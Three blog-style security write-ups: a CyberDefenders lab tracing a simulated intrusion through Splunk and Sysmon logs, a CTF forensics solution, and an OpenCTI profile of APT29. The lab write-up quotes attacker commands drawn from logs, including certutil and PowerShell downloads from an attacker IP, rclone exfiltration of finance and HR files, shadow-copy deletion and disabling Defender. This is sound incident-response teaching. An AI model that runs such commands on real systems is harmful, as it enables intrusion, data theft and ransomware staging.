title: CyberDefenders: StarkTech Incident - APT41 Lab
content:
IntroductionHi, I’m Mustafa, also known as 0xMustafa. I have a strong passion for Blue Team operations and threat hunting, focusing on detecting, analyzing, and mitigating security incidents in real-world scenarios. Over the past year, I’ve been actively solving labs on CyberDefenders, and previously I achieved Top 1 globally on the platform.
This writeup marks the beginning of my journey to share insights, techniques, and methodologies I use while solving CyberDefenders labs. My goal is to help fellow security enthusiasts understand practical approaches in detection, analysis, and mitigation while keeping the content professional, clear, and actionable.
Let’s dive in and have some fun while learning!

ScenarioOn August 25, 2025, CoreTech’s SOC spotted unusual activity on a workstation, hinting at a breach. Suspicious processes and network activity spread to critical servers, threatening data and systems.
Lab Link.
My AnalysisI will start analyzing the incident, detect the attack activity and after this I will move to the Questions to answer them, but first we need to analyze the incident without reading the questions to improve our skills in detection. 
Intial access and Executionin the first we need to detect how the attacker access the system and what is the activities he took to explore the system, we have a triage images of DESKTOP, File-Server and DC01(Domain Controller) and we have access to SIEM Solution Splunk, I will start by exploring the Log Sources that I have in the SIEM Solution. 
Query:| metadata type=sources
 
We have windows event logs and the most important source for us is Sysmon, because it contain a lot of useful information about Processes activity, registry activity, files activity and so on
System Monitor (Sysmon) is a Windows system service and device driver that, once installed on a system, remains resident across system reboots to monitor and log system activity to the Windows event log. It provides detailed information about process creations, network connections, and changes to file creation time. 
Now I want to see what is the Event IDs that we have in sysmon. 
Query:index=* source=XmlWinEventLog:Microsoft-Windows-Sysmon/Operational | stats count by EventCode 

Let’s summarize the most important event IDs 



Event ID
Description



1
proccess Creation


3
Network connection


7
Image loaded


8
CreateRemoteThread


10
ProcessAccess


11
FileCreate


12
RegistryEvent (Object create and delete)


13
RegistryEvent (Value Set)


15
FileCreateStreamHash


17
PipeEvent (Pipe Created)


18
PipeEvent (Pipe Connected)


22
DNSEvent (DNS query)


We Know that the Incident was in 25/8/2025 so we will focus in the events in this day, I always like to start by exploring the files that have been downloaded from the internet.
Query:index=* source=XmlWinEventLog:Microsoft-Windows-Sysmon/Operational EventCode=15 | table _time host file_path | sort _time
Explanation of the query:index=*This tells Splunk to search all indexes.
source=XmlWinEventLog:Microsoft-Windows-Sysmon/OperationalThis filters events coming only from the Sysmon Operational log.
EventCode=15Sysmon EventCode 15 means “File Created” or “File Stream Created” depending on the Sysmon version.
| table _time host file_pathtable selects only specific fields from the results.Here:_time → timestamp of the eventhost → the machine where the event happenedfile_path → the path of the created file
| sort _timeSorts the results by timestamp in ascending order.

No files were created on that day.Lets move to see the websites accessed by the users on that day, I will use earliest option to tell splunk that i want to events that created in the starting of day 25 and later
1756080000 convert it to UNIX timestamp -> `
Query:index=* EventCode=22 earliest=1756080000 | table QueryName,  _time | sort _time 
scrolling the result we can see that paste.sh accessed on 2025-08-25 13:27:40paste.sh allows you to paste text, code, or logs and share it via a link, so we need to check it, now i want to find the user that accessed this site, just click on the event and select view event.

 
the user who made the query was t.leao so I will back to the triage images and go to the browser history for this user.DESKTOP\uploads\auto\C%3A\Users\t.leon\AppData\Local\Microsoft\Edge\User Data\Defaultopening the history file using DB broswer.
 
ok now we have the link that accessed by the user, lets visit it, and se what is inside it. 
 
wow, this command used powershell to download exe file and store it in the temp, lest complete our analysis and confirm that this was the intial access of the attacker 
Query:index=* source=XmlWinEventLog:Microsoft-Windows-Sysmon/Operational Image=*iexploreplugin.exe | stats count by EventCode 
this query will help as to see what is the activities of this process.

we have activites related to process creation, file creation, network connection, image loading, registry set values. 
after running the executable, it made network connection to two IPs, 10.10.5.62 and 10.10.11.74 with ports 8080, 49668, 135the most intersting thing that there is 1768 connections made from the executable to 10.10.5.62:8080,it seems to be C2. 

now I want to see if this proccess spawned another processes or executed some suspicious commands. 
Query:index=* source=XmlWinEventLog:Microsoft-Windows-Sysmon/Operational EventCode=1 ParentImage=*iexploreplugin.exe | table _time Image CommandLine ParentImage ParentCommandLine SHA256 |sort _time 

wow, We have captured the attacker.
SummaryThe attack started on 2025-08-25 at 13:27:40 when the user t.leao interacted with a malicious script hosted on paste.sh. This triggered the download of iexploreplugin.exe, which served as the malware providing the attacker with initial access.
Once executed, the malware connected to the attacker’s C2 server at 10.10.5.62:8080 and ran a series of discovery commands to map the environment.
DiscoveryIn the previous section, we observed that after establishing C2 communication, the attacker executed several discovery commands to gain a better understanding of the compromised environment. This phase is critical, as it allows the attacker to enumerate system, user, and network information before moving to the next stage of the attack.
Below is a breakdown of the observed discovery activity and its purpose:

cmdkey /list

Binary: C:\Windows\System32\cmdkey.exePurpose:Lists all stored credentials in the Windows Credential Manager.
Why attackers use it:Identify cached credentials (RDP, SMB, scheduled tasks, services)Target credentials that can be reused for lateral movement

net view \\coretech.lab\SYSVOL

Binary: C:\Windows\System32\net.exePurpose:Enumerates the SYSVOL share of the domain controller.
Why attackers use it:Identify domain structureLocate Group Policy Objects (GPOs)Search for scripts containing hardcoded credentials

net user /domain

Purpose:Lists all domain user accounts.
Why attackers use it:Identify high‑value accountsMap the domain’s user landscape

net user

Purpose:Enumerates local user accounts on the compromised system.
Why attackers use it:Identify local admins or service accounts

net localgroup administrators

Purpose:Lists all members of the local Administrators group.
Why attackers use it:Check if the compromised user already has administrative privilegesIdentify accounts worth targeting for escalation

whoami

Binary: C:\Windows\System32\whoami.exePurpose:Displays the current user context.
Why attackers use it:Confirm which account is compromised

ping -n 1 DC01

Binary: C:\Windows\System32\PING.EXEPurpose:Checks connectivity to the domain controller (DC01).
Why attackers use it:Verify domain reachabilityConfirm internal network accessTest if lateral movement is possible.

net group "Domain Admins" /domain

Purpose:Enumerates all members of the Domain Admins group.
Why attackers use it:Identify top-tier privileged accounts

whoami /all

Purpose:Displays: User SID, Group memberships, Assigned privileges and tokens
Why attackers use it:Check for powerful privileges (e.g., SeDebugPrivilege)Identify misconfigurations

tasklist

Binary: C:\Windows\System32\tasklist.exePurpose:Lists all running processes.
Why attackers use it:Identify security tools (AV, EDR, logging agents)Spot high‑value processes (LSASS, browsers)
SummaryThe attacker executed a series of built‑in Windows discovery commands to enumerate credentials, user privileges, domain information, and running processes after gaining initial access.
PersistanceThe attacker downloaded and setup multiple Remote Management Tools(RMM) on the compromised system between 2025-08-25 13:45:35 and 2025-08-25 14:00:00. 
Query:index=* source=XmlWinEventLog:Microsoft-Windows-Sysmon/Operational EventCode=1 earliest=1756128800 AND NOT chocolatey| table _time Image CommandLine ParentImage ParentCommandLine host |sort _time 
This query will help us to find what commands and processes executed by the attacker after the intial discovery. 

Ad to see the Services Installed we need to use Security Event ID 4697.
Query:index=* EventCode=4697 earliest=1756128800 | table _time, host, service_name | sort _time


First RMM(AteraAgent)A legitimate RMM agent used for remote monitoring, system management, and script execution on endpoints. Attackers often abuse it for persistent remote access while blending in with normal IT activity.

powershell -Command "Invoke-WebRequest -Uri 'https://HelpdeskSupport1755068837448.servicedesk.atera.com/GetAgent/Msi/?customerId=1&amp;integratorLogin=bunionsneaker.4m%%40gmail.com&amp;accountId=001Q300000VzBKuIAN' -OutFile C:\Windows\Temp\setup.msi; Start-Process msiexec -ArgumentList '/i C:\Windows\Temp\setup.msi /qn IntegratorLogin=bunionsneaker.4m@gmail.com CompanyId=1 AccountId=001Q300000VzBKuIAN' -Wait"

this command will download msi file (AteraAgent Installer) and save it as setup.msi, then execute it using msiexec.exe to download AteraAgent Tool with login email bunionsneaker.4m@gmail.com and accountId 001Q300000VzBKuIAN

Second RMM(SplashtopRemoteService)Provides remote desktop access for IT support and administration. When misused, it allows attackers to maintain stealthy interactive access without deploying custom malware.

Third RMM(AnyDesk)A popular remote access tool that enables full remote control of a system. Threat actors frequently leverage it to gain hands‑on access while bypassing traditional security detections.


After that, while searching through the created files, I found that two files were created under this path C:\Windows\System32\Tasks\ , which means they are scheduled tasks. 
scheduled tasks names: AteraAgentServiceWatchdog and Monitoring Recovery, Since these task files are present in the triage image, their configurations can be examined to extract the executed commands and understand how persistence was maintained.


The two scheduled tasks was configured to run the AteraAgent tool.
SummaryBetween 13:45 and 14:00, the attacker established persistence by installing multiple RMM tools (AteraAgent, Splashtop, and AnyDesk) to maintain long‑term remote access. Persistence was reinforced through scheduled tasks (AteraAgentServiceWatchdog and Monitoring Recovery) configured to automatically execute the AteraAgent service.
Defense EvasionDuring the analysis of commands executed by iexploreplugin.exe, it was observed that the attacker attempted to disable Windows Defender real-time protection as a defense evasion technique.
powershell.exe -WindowStyle Hidden -Command Set-MpPreference -DisableRealtimeMonitoring

This command disables real-time monitoring, allowing malicious activity to proceed with reduced detection and increasing the attacker’s ability to maintain access and execute follow-on actions undetected.

Note: In the image we can see that this process executed a vbs script.
cscript.exe C:\Users\t.leon\scvhost.vbs
I am sure its malicious but I dont know what it is doing so I will back for it later.
Additionally, during the initial access phase, Sysmon Event ID 8 (CreateRemoteThread) revealed that iexploreplugin.exe injected into other running processes. After filtering for this event, it was confirmed that the malware accessed both notepad.exe and spoolsv.exe, indicating process injection.
By migrating into these legitimate processes, the attacker aimed to hide malicious activity, evade detection, and blend in with normal system behavior, a common defense evasion technique, we need to discover why the attacker used these two processes and how (I will cover this later now we need to save the Process IDs for them).

spoolsv proccess ID: 3016notepad process ID: 14956
SummaryThe attacker used multiple defense evasion techniques, including disabling Windows Defender real‑time protection and performing process injection into legitimate processes (notepad.exe and spoolsv.exe) to conceal malicious activity. These actions reduced detection visibility and allowed the malware to blend into normal system behavior while maintaining execution.
Credential AccessNow we know that the attaker Injected two processes notepad.exe and spoolsv.exe, while I am seraching for any Credential access techniques I used this query to find what processes accessed lsass.exe.
Query:index=* source=XmlWinEventLog:Microsoft-Windows-Sysmon/Operational EventCode=10 TargetImage=*lsass.exe earliest=1756128800 | table _time SourceImage SourceProcessId |sort _time 

The attacker targeted the lsass.exe three times, first two attempts was using iexploreplugin.exe and last one was using spoolsv.exe.last attempt was in 2025-08-25 13:56:54
SummaryThe attacker attempted credential access by targeting lsass.exe multiple times, indicating an effort to dump or access stored credentials.
Lateral MovementLet me ask you a question: Why does the attacker need to extract passwords from lsass.exe?Of course, it’s to use them to gain higher privileges and expand the scope of their attack to more than one device within the domain,So lets discover if the attacker accessed anothor accounts or machines.
I will use Security Event ID 4624 to find succefull login attempts to FILE-SERVER and DC01. 
Query 1:index=* host="FILES-Server" EventCode=4624 src_ip!="-"| table _time, LogonType, Target_User_Name, src_ip | sort _time

we can easelly confirm that the attacker accessed account admin123 after dumping the hashs from lsass.exe and logon to File-Server using this account. 
first logon at 2025-08-25 13:58:52 with LogonType=3 (network logon), TargetUserName=admin143, and IpAddress=10.10.5.62. The source IP 10.10.5.62 matches the attacker’s infrastructure.
Query 2:index=* host="DC01" EventCode=4624 src_ip!="-" earliest=1756128800 | table _time, LogonType, Target_User_Name, src_ip | sort _time

the attacker logon to the DC with the same username and source IP,first logon was at 2025-08-25 14:34:30
summaryAfter dumping credentials from lsass.exe, the attacker used the recovered credentials to perform lateral movement by successfully authenticating to both the File Server and the Domain Controller. The successful network logons (Event ID 4624) using the admin143 account from the attacker-controlled IP 10.10.5.62 confirm credential reuse to expand access across the domain.
POST Lateral MovementAt this stage, we focus on the attacker’s activity after gaining access to the File Server and Domain Controller (DC01).
Query:index=* source=XmlWinEventLog:Microsoft-Windows-Sysmon/Operational EventCode=1 earliest=1756128800 (host="DC01" OR host="FILES-SERVER" ) AND NOT chocolatey |  table _time Image CommandLine ParentImage ParentCommandLine SHA256 host |sort _time

Using Sysmon Event ID 1, we observed that the attacker began enumerating the File Server shortly after successful authentication. Shortly after, PowerShell was used to download a ZIP archive and store it in the Downloads directory.
powershell  -c iwr -uri http://10.10.5.171:8883/python.zip -outfile C:\Users\admin143\Downloads\python.zip

The attacker then extracted the archive:
powershell  -c "Expand-Archive -Path 'C:\Users\admin143\Downloads\python.zip' -DestinationPath 'C:\Users\admin143\Downloads' -Force"

lets see what is the files that was in this zip file.
Query:index=* source=XmlWinEventLog:Microsoft-Windows-Sysmon/Operational EventCode=11 earliest=1756128800 host="FILES-SERVER" TargetFilename=*Downloads\\python* | table _time TargetFilename |sort _time

Analysis of file creation events showed that python.zip contained two files: testc.exe and python311.dll. After executing testc.exe, two additional files appeared in the Downloads directory, indicating further payload execution.

ok, lets complete our analysis.
Later, at 2025-08-25 14:17:04, the attacker compressed sensitive files into a single archive:
powershell  -c Compress-Archive -Path 'C:\Shares\Shares\Finance.csv','C:\Shares\Shares\HR.csv' -DestinationPath 'C:\ProgramData\Teams\teams-skartech.zip'

At 2025-08-25 14:25:03, the archive was exfiltrated using the remote synchronization tool rclone, uploading it to a remote storage location named starktech-backups.
C:\ProgramData\Teams\rclone\rclone-v1.71.0-windows-amd64\rclone.exe copy teams-starktech.zip remote:starktech-backups

all these activites was in the File Server, bSubsequently, the attacker downloaded multiple scripts and modules to DC01 using both PowerShell and certutil:
powershell -c "Invoke-WebRequest -Uri https://raw.githubusercontent.com/muahmmedshahblis/blabla/refs/heads/main/crypto.psm1 -OutFile C:\ProgramData\crypto.psm1cmd.exe /Q /c certutil -urlcache -split -f https://raw.githubusercontent.com/muahmmedshahblis/blabla/refs/heads/main/script.ps1 C:\ProgramData\script.ps1certutil  -urlcache -split -f http://10.10.5.171:8883/up.bat C:\Users\Public\up.batcertutil  -urlcache -split -f http://10.10.5.171:8883/dhsf82.bat C:\Programdata\Microsoft\dhsf82.bat

The attacker then executed dhsf82.bat using PowerShell with execution policy bypass. This script modified registry keys to enable automatic logon, storing the plaintext password CyberNight!128.
powershell  -ExecutionPolicy Bypass -File C:\Programdata\Microsoft\dhsf82.batreg   add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword /t REG_SZ /d CyberNight!128 /f
then he deleted all shadow copies in the DC01, so i think he is preparing for deploying ransomware or the scripts will be used for encryption purposes
vssadmin  delete shadows /all /quiet
Finally, a text file named Recover-Files.txt was downloaded to the administrator’s desktop. Although the file was not present in the triage image, its naming strongly suggests it was used as a ransomware note, indicating preparation for or execution of an encryption stage.
certutil  -urlcache -split -f http://10.10.5.171:8883/Recover-Files.txt C:\Users\admin143\Desktop\Recover-Files.txt

SummaryAfter lateral movement, the attacker performed data collection and exfiltration using PowerShell and rclone, targeting sensitive files on the File Server. Activity on DC01 indicates ransomware preparation, including script execution, credential persistence, shadow copy deletion, and the deployment of a ransom note.
ConclusionThis analysis was done before reading the questions, as I focused on investigating the attack end-to-end. While most activity was identified early on, a few important details were discovered later while solving the questions.
The QuestionsIntial Access
The intrusion started when the victim accessed a suspicious URL from a file-sharing service. What was the name of the website that triggered the compromise?

Answer: paste.sh
Execution
After visiting the site, the victim ran a PowerShell command via Run. What’s the full URL of the file downloaded and executed?

Answer: http://10.10.5.171:8883/iexploreplugin.exe

A malicious zip file was extracted on the Files Server, yielding two files. What are the names of these extracted files?

Answer: testc.exe,python311.dll

When one file from Q3 was executed, two additional files appeared on the host. What are the names of these dropped files?

Answer: ws2_32.exe,system_module.exe
Command and Control
Network logs reveal an outbound connection from the payload. What’s the attacker’s IP address and port used for the initial C2 communication?

Answer: 10.10.5.62:8080

The attacker connected to a secondary command-and-control server. What’s the domain name of this C2 server?

Query:index=* host="FILES-Server" EventCode=22 | search Image=*ws2_32.exe* OR Image=*system_module.exe*| table _time, Image, QueryName, answer| sort - _time
Answer: agegamepay.comthe IP for this domain was 10.10.5.245
The ws2_32.exe file was connecting to this C2 after running. 

Executing the files from Q4 triggered connections to the attacker’s C2 server. What are the two ports used for these connections?

Query:index=* host="FILES-Server" EventCode=3 DestinationIp=10.10.5.245| search Image=*ws2_32.exe* OR Image=*system_module* | table _time,Image, SourceIp, DestinationIp, DestinationPort | sort - _time
Answer: 8443,8083
Persistence
During persistence, the attacker leveraged integrator credentials for remote management software. Which credentials were used to link to their account?

Answer: bunionsneaker.4m@gmail.com,001Q300000VzBKuIAN

The attacker installed three remote management services for persistence. What are the names of these services?

Answer: AteraAgent,SplashtopRemoteService,AnyDesk

Installing the remote management tool from Q9 created two scheduled tasks. What are the names of these tasks?

Answer: Monitoring Recovery,AteraAgentServiceWatchdog

During the persistence phase, the attacker created a shortcut to ensure malicious code execution. Which script was responsible for creating this shortcut?

Answer: scvhost.vbs

On the domain server, the attacker configured automatic logon using a user’s credentials. What is the password used, and what is the name of the script responsible for this configuration?

Answer: CyberNight!128,dhsf82.bat
Discovery
During reconnaissance, the attacker enumerated domain accounts. What’s the command used to list all domain users?

Answer: net user /domain

The attacker, during reconnaissance, ran an enumeration tool via C2 after migrating to another process. The tool then generated an output file on the victim host. Which process did they migrate into, and what zip file was created?

Answer: notepad.exe,20250825133552_BloodHound.zip
I missed the file name but we can solve it easily because we know which processes injected, just we want to see file creation activities.
Query:index=* source=XmlWinEventLog:Microsoft-Windows-Sysmon/Operational EventCode=11 (ProcessId=3016 OR ProcessId=14956) earliest=1756126833 |table _time TargetFilename| sort _time

Defense Evasion
To evade detection, the attacker disabled a Windows Defender feature. What’s the full command used for this?

Answer: powershell.exe -WindowStyle Hidden -Command Set-MpPreference -DisableRealtimeMonitoring
Credential Access
The attacker managed to dump hashes on the DESKTOP host. What is the process they migrated to before dumping the hashes?

Answer: spoolsv.exe
Lateral Movement
During lateral movement, the attacker accessed the file server. What’s the username used for this access?

Answer: admin143

Determining the timestamp of lateral movement to the Domain Controller is key for attack analysis. When did the attacker successfully access it?

Answer: 2025-08-25 14:34
Collection
The attacker compressed specific files on the compromised file server for exfiltration. What is the full path to the file where the attacker saved the compressed data?

Answer: C:\ProgramData\Teams\teams-skartech.zip
Exfiltration
The attacker used a tool for syncing files to cloud storage to exfiltrate data from the compromised file server. What is the name of the specific folder or path on the remote storage service used for exfiltration?

Answer: starktech-backups
Impact
The attacker downloaded two scripts to the Domain Controller to attempt file encryption. What are the names of these two scripts?

Answer: crypto.psm1,script.ps1 
ConclusionThanks for reading and I hope you learned something new from my writeup.

title: 0xL4ugh CTF V5 Forensics Writeup
content:
Introductionin this CTF I played with my team PwnSec and after 48 Hours of competition, we secured second place.
and I managed to solve 3/4 of the DFIR challenges with me temmates so lets start with the writeup.
Zero Hour [Medium]DescriptionOur intelligence unit has successfully identified a long-time cybercriminal. According to information provided by our confidential informant, he is preparing something major, and time is critical.Your mission is to investigate the suspect’s laptop and uncover the following information:What is the name of the victim?What is the encryption key?Flag: 0xL4ugh{name;key}
SolutionWe have a disk image of the suspect’s laptop and we want to analyze it, first thing I decided to see the downloads folder to see what is the suspect downloaded, and we got some important things:he donwloaded discord, outlook and telegram, all these applictions are used for commincations so I thought that we need to analyze them, so I started by analyzing the discord cache and it was empty with nothing intersting, then I moved to outlook artifacts and also nothing intersting so the last option is telegram but there is no artifacts related to it immeditly so after some search in the artifacts I found the first answer in the notifications database.C:\Users\tarok\AppData\Local\Microsoft\Windows\Notifications\wpndatabase.db
open this database using DB browser and select the Notifications table you can see a notification from telegram and the text is next target is Purdue Petenow we have the first part lets move to the second one.while analyzing the disk image I saw that the attacker downloaded WSL from the PowerShell History.C:\Users\tarok\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
wsl --installwsl --install -d kali-linux

so I decided to analyze the artifacts of wsl, we can find the WSL drive inC:\Users\tarok\AppData\Local\wsl\{e49649b6-5696-4474-a155-3ed599c71619} 
 
now we need to export the drive and try to analyze it.
now in the home directory we can find file setup.exe upload it to virus total and we can confirm that this file is ransomware, here we can find the encryption key but we need to analyze the malware.
note: in this point I gived the malware to my temmate m7md and he analyzed it and gived me the key.encryption key: CC2E406C5A9CF1202256672389781D0EBECBF73BBC091B035F88A41B90B7B07F
Flag: 0xL4ugh{Purdue Pete;CC2E406C5A9CF1202256672389781D0EBECBF73BBC091B035F88A41B90B7B07F}
The Hood [Hard]DescriptionTeddy MacDonald, a senior CIA operative, is under investigation after classified files leaked from his personal computer. A security camera captured an unidentified individual breaking into Teddy’s residence and tampering with his workstation.Your mission is to analyze the evidence and uncover the truth—was this a targeted intrusion, or is there more to the story? Using your investigative skills, help the team piece together the events.
Solutionin this challenge the attacker access the computer physically. 

(1/17) The intruder connected a device to Teddy’s machine during the breach. Can you uncover its serial number? 

ok after the attacker accessed the machine he connected a device(USB) to it and now we need to collect some informations about this device.first thing is the serial number, we will use the regsitry hive SYTEM for this missionHKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\USBSTOR 

here we can se the serial number UM2I126E 

(2/17) What is the manufacturer of this device? [company name] 

from the device name we can see the company name (just do some search about it)answer Transcend 

(3/17) What is the friendly name that, the intruder assigned to this device?

here we will move to the second hive SOFTWAREand in the key windows protable devices or MountedDevices we can see the friendly name

answer: OMKALALA

(4/17) After the guy walked in, we need to know how much time he used Teddy’s machine for?

here we need to compine the investigation from multiple artifacts to find the answer, the attacker first connect the device to the machine in 2024-12-10 22:00:21 so he logon to the machine shortly before that, so we need to find the logon time of this LogonID, lets move to the security logs.first logon to user a1l4m before this was in 2024-12-10 21:59:52 and the Logoff was in 12-10 22:05:45.
Logon: 
Logoff: 
answer: 2024-12-10 21:59:52_2024-12-10 22:05:45 

(5/17) During their brief stay, the attacker appeared to be scouting the system. Which application did they use for reconnaissance?

now we need to the applications that the attacker run it after he access the machine, so lets use prefetch files 
the first useful app that run after the logon was taskmgr.exe

(6/17) In the reconnaissance stage the attacker found a vulnerable service on the machine. What is the CVE number assigned to this vulnerability?

the attacker was use the task manager to enemurate the services installed in the system to find any vulnarable service.This Question take some time from me but i got it in my method, after parse the $MFT and search for the created files after the logon I found one dll created after the logon.
 
Fortunately we have the dll so we can get the hash and upload it to virustotal
 
ok we find the malware, lets find the cve that related to this dll and XPS Card Printer, just the first result in google was the cve. 
 
answer: CVE-2024-34329
the cve uses sideloading technique(replace the legitimate dll with a malicious dll in the same path, when the executable run it will load the dll and the maliciouse code will run)

(7/17) What is the SHA1 hash of the file that he used to exploit the service?it is just the hash of the dll 

answer: 7ba477a58eb546b6d3cac3a86633b531ba82fa50

(8/17) What MITRE technique is used by the attacker here? 

Dll Side loading -> T1574.002

(9/17) To cover their tracks, the attacker executed multiple commands to disable system logging. What is the name of the file that has these commands? 

The first thing that came to my mind at that moment was that the commands should be in a PowerShell script, so I went to the powershell logs. 

so we was in the right place. 
answer: svc1D3C.ps1

(10/17) To establish persistence, The intruder downloaded additional payloads. What is the IP and Port of the storage C2 server? Format IP:Port

here we need to reverse the dll becouse we dont have logs to store the network connections, i am not good at reverse but this part was easy and I got it by my self.
answer: 3.75.217.26:8080

(11/17) The attacker established a shell connection to a remote server. Your job: pinpoint the exact time the connection started. Format YYYY-MM-DD HH:MM:SS

ok let’s go back to the prefetch files and we need to find when the cmd.exe started. 

here we can find the first time when the cmd.exe run after the attacker logon to the machine. 
answer: 2024-12-11 04:01:41

(12/17) Which IP address and port were used by the attacker to establish the shell and communicate with the C2 server? Foramt IP:port

This is the most difficult part of the entire CTF (anyone who has participated in this CTF knows what I mean).
here we need to get the shellcode that the dll dropped, again back to me rev teammate, after the team managed to get the shellcode from the dll I just used speakeasy to run the shellcode and it works

title: CyberDefenders:OpenCTI 101 - APT29 Lab
content:
IntroductionHi, I’m Mustafa, also known as 0xMustafa. I have a strong passion for Blue Team operations and threat hunting, focusing on detecting, analyzing, and mitigating security incidents in real-world scenarios. Over the past year, I’ve been actively solving labs on CyberDefenders, and previously I achieved Top 1 globally on the platform.

My goal is to help fellow security enthusiasts understand practical approaches in detection, analysis, and mitigation while keeping the content professional, clear, and actionable.
Let’s dive in and have some fun while learning!
ScenarioAs a Threat Intelligence Analyst at SecureShot MDR, you play a key role in uncovering and analyzing emerging cyber threats to strengthen proactive defense. Currently focused on APT29, you leverage OpenCTI to track their evolving tactics, techniques, and procedures—connecting malware artifacts, infrastructure patterns, and past operations. Your intelligence directly informs detection strategies, helping the organization anticipate and mitigate advanced threats with precision.
Lab Link.
My AnalysisIn this article, I will begin by explaining the meaning of APT and CTI (Cyber Threat Intelligence), as well as introducing OpenCTI and demonstrating how to use it.
After establishing this foundation, I will use OpenCTI to collect and analyze intelligence related to APT29. The goal is to examine this group’s tactics, techniques, and procedures (TTPs), identify the malware families they have used, and gain deeper insight into their operational patterns.
APTAn Advanced Persistent Threat (APT) is a sophisticated cyberattack in which attackers quietly enter and remain hidden inside a network for an extended period, carefully avoiding detection.
APTs focus on secretly stealing sensitive information, such as intellectual property, financial data, or government secrets.
The attackers typically gain access, establish hidden control, and patiently extract valuable data over weeks, months, or even years.
CTI (Cyber Threat Intelligence)Cyber threat intelligence (CTI) is the process of collecting, analyzing, and applying data on cyber threats, adversaries, and attack methodologies to enhance an organization’s security posture. It involves taking raw threat data from various sources and transforming it into actionable insights that enable organizations to anticipate, detect, and respond to cyber risks.
OpenCTIOpenCTI (Open Cyber Threat Intelligence) is an open-source platform designed to aggregate, manage, and visualize cyber threat intelligence in one unified system.
It is designed to:

Store information about threats, like malware, campaigns, and IOCs.
Analyze the relationships between these threats.
Visualize the data, showing connections in an understandable way.
Present the information so it’s easy to act upon

Exploring APT29 using OpenCTI
OpenCTI Dashboard


Here, we can view the latest reports, the most active threats, and the most prevalent malware. We can also search for any indicator of compromise (IOC) or tag (for example, APT29). Let’s perform a search for the APT29 group.

The search returns multiple results across different entity types, including reports, malware, campaigns, and intrusion sets. While all of these results are related to APT29, the most relevant starting point for our analysis is the Intrusion Set entry. This entity provides consolidated and high-level information about the threat group, making it the most useful reference for understanding APT29’s overall profile.

In the overview section, we can see general information about the group. By scrolling down, we can also examine recently created relationships, external references, and related intelligence reports.
Target Summary: APT29
APT29 is a threat group attributed to Russia’s Foreign Intelligence Service (SVR). (Citation: White House Imposing Costs RU Gov, April 2021; UK Government Malign RIS Activity, April 2021). The group has been active since at least 2008 and has primarily targeted government networks in Europe and NATO member states, as well as research institutes and think tanks.
now we will move to the knowledge section so we can collect more information about this APT group. 

From the right-hand menu, we can explore a wide range of intelligence related to this group, including its targeted victims, associated campaigns, malware families, tools, and documented attack patterns. This section provides deeper insight into the group’s operational behavior and relationships within the threat landscape.

Victimology


The Victimology section provides insight into the geographic and sector-based targeting patterns of APT29. This information helps us understand the group’s strategic objectives and areas of operational focus.
Targeted Countries:

Poland
Ukraine
United States
Japan
Czechia

Targeted Sectors:

Telecommunications
Technology
Government
Military
Foreign Affairs

Here is a more professional and well-structured version of your section:

Campaigns

In this section, we can review the campaigns associated with the APT29 group. Campaign analysis helps us understand how the group executes operations over time, including the tools, malware, and techniques used in specific intrusions.

SolarWinds Compromise

The SolarWinds Compromise was a highly sophisticated supply chain operation attributed to APT29 and publicly disclosed in mid-December 2020. In this campaign, APT29 injected malicious code into the SolarWinds Orion software build process. The trojanized update was then digitally signed and distributed to customers through legitimate software updates, allowing the attackers to gain access to numerous high-profile organizations.
Tools used in this campaign:

Mimikatz
AdFind

Malware used in this campaign:

This campaign demonstrates APT29’s advanced capabilities in supply chain compromise, stealthy persistence, and large-scale espionage operations.

Operation Ghost

Operation Ghost was an APT29 campaign that began in 2013 and targeted ministries of foreign affairs in Europe, as well as the Washington, D.C. embassy of a European Union country. During this operation, APT29 deployed new malware families and leveraged web services, steganography, and dedicated command-and-control (C2) infrastructure tailored to each victim.(Citation: ESET, The Dukes, October 2019)
Tools used in this campaign:

PsExec

Malware used in this campaign:

Attack Patterns Observed in Operation GhostThe campaign leveraged several MITRE ATT&CK techniques, including:

Initial Access:

Valid Accounts (T1078)


Persistence:

Valid Accounts (T1078)
Event-Triggered Execution (T1546)


Privilege Escalation:

Valid Accounts (T1078)
Event-Triggered Execution (T1546)


Command and Control (C2):

Data Obfuscation (T1001)
Web Service (T1102)



The use of legitimate credentials, event-triggered execution mechanisms, and obfuscated C2 communications highlights APT29’s emphasis on stealth, persistence, and long-term intelligence collection.

Tools

We will now step back to examine the tools most commonly used by the APT29 group and analyze the purpose of each tool within their operations.

Tools Breakdown

Tor  Tor is a software suite and network that provides increased anonymity on the Internet. It creates a multi-hop proxy network and utilizes multilayer encryption to protect both the message and routing information.

Tasklist  The Tasklist utility displays a list of applications and services with their Process IDs (PID) for all tasks running on either a local or a remote computer.

Systeminfo  Systeminfo is a Windows utility that can be used to gather detailed information about a computer.

Sliver  Sliver is an open source, cross-platform, red team command and control framework written in Golang.

SDelete  SDelete is an application that securely deletes data in a way that makes it unrecoverable. It is part of the Microsoft Sysinternals suite of tools. 

ROADTools  ROADTools is a framework for enumerating Azure Active Directory environments. The tool is written in Python and publicly available on GitHub.

PsExec  PsExec is a free Microsoft tool that can be used to execute a program on another computer. It is used by IT administrators and attackers.

Net  The Net utility is a component of the Windows operating system. It is used in command-line operations for control of users, groups, services, and network connections. 

Mimikatz  Mimikatz is a credential dumper capable of obtaining plaintext Windows account logins and passwords, along with many other features that make it useful for testing the security of networks

meek  meek is an open-source Tor plugin that tunnels Tor traffic through HTTPS connections.

ipconfig  ipconfig is a Windows utility that can be used to find information about a system’s TCP/IP, DNS, DHCP, and adapter configuration.

Impacket  Impacket is an open source collection of modules written in Python for programmatically constructing and manipulating network protocols. Impacket contains several tools for remote service execution, Kerberos manipulation, Windows credential dumping, packet sniffing, and relay attacks.

BloodHound  BloodHound is an Active Directory (AD) reconnaissance tool that can reveal hidden relationships and identify attack paths within an AD environment.

AdFind  AdFind is a free command-line query tool that can be used for gathering information from Active Directory.

AADInternals  AADInternals is a PowerShell-based framework for administering, enumerating, and exploiting Azure Active Directory.



Attack Patterns

APT29 employs a wide range of attack patterns, making it one of the most sophisticated threat groups. While it is not possible to cover all patterns in this post, we will highlight some key techniques to illustrate their operational approach.


Reconnaissance

Gather Victim Identity Information(T1589)
Active Scanning(T1595)


Initial Access

Drive-by Compromise(T1189) 
Exploit Public-Facing Application(T1190)


Execution 

Windows Management Instrumentation(WMI)
Native API(T1106)


Persistence 

External Remote Services(T1133)
Create Account(T1136)


Impact 

Inhibit System Recovery(T1490)


